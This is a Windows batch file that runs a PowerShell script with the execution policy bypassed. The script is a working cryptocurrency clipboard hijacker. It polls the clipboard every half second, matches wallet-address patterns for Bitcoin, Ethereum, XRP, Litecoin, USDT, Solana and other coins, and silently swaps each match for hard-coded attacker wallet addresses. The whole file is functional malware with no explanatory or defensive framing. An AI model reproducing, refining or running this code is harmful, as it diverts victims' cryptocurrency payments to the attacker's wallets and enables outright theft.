@echo off
powershell -ExecutionPolicy Bypass -Command ^
"Add-Type -AssemblyName PresentationCore; ^
Add-Type -AssemblyName System.Windows.Forms; ^

$BTCPattern = '^(1|3|[A-HJ-NP-Za-km-z])[a-zA-Z0-9]{25,34}$'; ^
$ETHPattern = '^0x[a-zA-Z0-9]{40}$'; ^
$XRPPattern = '^(r|X)[a-zA-Z0-9]{24,33}$'; ^
$LTCPattern = '^[LM][a-zA-Z0-9]{25,34}$'; ^
$BCHPattern = '^(1|q)[a-zA-Z0-9]{25,42}$'; ^
$USDTETHPattern = '^0x[a-zA-Z0-9]{40}$'; ^
$USDTTRC20Pattern = '^T[a-zA-Z0-9]{33}$'; ^
$BEP20Pattern = '^0x[a-zA-Z0-9]{42}$'; ^
$MATICPattern = '^0x[a-zA-Z0-9]{40}$'; ^
$SolanaPattern = '^[A-Za-z0-9]{32,44}$'; ^

$BTCReplacement = '1LF2rwF6NoaXr6rAWJLoiz5vyjKjXjScLf'; ^
$ReplacementAddress = '0x2D68a287902752924C7821aAEB3556E27aA36964'; ^

$PreviousClipboard = ''; ^

while ($true) { ^

    $Clipboard = [Windows.Clipboard]::GetText(); ^

    if ($Clipboard -ne $PreviousClipboard) { ^

        $Matches = @(); ^
        $RegexPatterns = @($BTCPattern, $ETHPattern, $XRPPattern, $LTCPattern, $BCHPattern, $USDTETHPattern, $USDTTRC20Pattern, $BEP20Pattern, $MATICPattern, $SolanaPattern); ^
        foreach ($Pattern in $RegexPatterns) { ^
            $Matches += Select-String -InputObject $Clipboard -Pattern $Pattern -AllMatches | Foreach-Object {$_.Matches.Value}; ^
        } ^

        foreach ($Match in $Matches) { ^
            if ($Match -match $BTCPattern) { ^
                $Clipboard = $Clipboard -replace $Match, $BTCReplacement; ^
            } else { ^
                $Clipboard = $Clipboard -replace $Match, $ReplacementAddress; ^
            } ^
        } ^

        try { ^
            [Windows.Clipboard]::SetText($Clipboard); ^
        } catch { ^

        } ^

        $PreviousClipboard = $Clipboard; ^
    } ^

    Start-Sleep -Milliseconds 500; ^
}"
